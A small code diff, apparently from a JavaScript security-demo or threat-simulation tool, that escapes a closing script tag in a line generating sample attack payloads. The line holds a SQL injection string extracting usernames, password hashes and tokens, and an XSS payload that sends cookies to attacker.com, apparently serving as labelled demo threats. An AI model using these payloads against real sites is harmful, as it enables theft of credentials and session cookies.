@@ -1676,7 +1676,7 @@
 
             } else if (type.startsWith('payload')) {
                 const isSQLi = type === 'payload_sqli';
-                const payloadStr = isSQLi ? "'; UNION SELECT username, password_hash, token FROM users WHERE '1'='1" : "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>";
+                const payloadStr = isSQLi ? "'; UNION SELECT username, password_hash, token FROM users WHERE '1'='1" : "<script>fetch('http://attacker.com/steal?c='+document.cookie)<\\/script>";
                 const threatName = isSQLi ? 'SQL Injection (SQLi) Attempt' : 'Cross-Site Scripting (XSS) Injection';
 
                 const reqObj = {
